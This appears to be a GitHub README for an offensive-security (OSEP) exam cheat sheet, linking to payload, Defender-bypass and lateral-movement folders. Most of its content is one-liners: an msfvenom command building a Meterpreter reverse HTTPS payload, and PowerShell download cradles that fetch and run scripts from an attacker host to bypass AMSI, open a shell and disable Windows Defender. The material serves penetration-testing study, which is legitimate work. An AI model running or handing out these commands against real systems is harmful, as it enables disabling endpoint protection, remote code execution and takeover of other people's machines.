# OSEP 
this repository modified based on from `https://github.com/In3x0rabl3/OSEP`

# Summary

This repository will refresh your memory when taking the OSEP exam. 
<br>
Thank you, to everyone who's code was used in this repository.


# Table of Contents

- [OSEP_Reference](https://github.com/In3x0rabl3/OSEP/blob/main/osep_reference.md)
- [OSEP_Checklist](https://github.com/In3x0rabl3/OSEP/blob/main/osep_checklistv2.md)
- [OSEP_Payloads](https://github.com/In3x0rabl3/OSEP/tree/main/Payloads)
- [OSEP_Bypass_Defender](https://github.com/In3x0rabl3/OSEP/tree/main/Bypass_Defender)
- [OSEP_Lateral_Movement](https://github.com/In3x0rabl3/OSEP/tree/main/Lateral_Movement)
- [OSEP_MSSQL](https://github.com/In3x0rabl3/OSEP/tree/main/MSSQL)


# OneKey Bypass Powershell And Get Shell
```
msfvenom -p windows/x64/meterpreter/reverse_https LHOST=10.0.0.234 LPORT=443 -f ps1
(New-Object Net.WebClient).DownloadString('http://10.0.0.234:8000/msfvenom_bin/bypass_Ams1_getShell.ps1') | IEX;
```
# OneKey Bypass Posershell AMSI
```
(New-Object Net.WebClient).DownloadString('http://10.0.0.234:8000/bypass_defender/bypassAms1.ps1') | IEX;
```

# OneKey Disable Windows Defender
```
(New-Object Net.WebClient).DownloadString('http://10.0.0.234:8000/bypass_defender/DefendersDeath.ps1') | IEX;
(New-Object Net.WebClient).DownloadString('http://10.0.0.234:8000/bypass_defender/DisableDefender.ps1') | IEX;
+ (need administrator priviledge)
```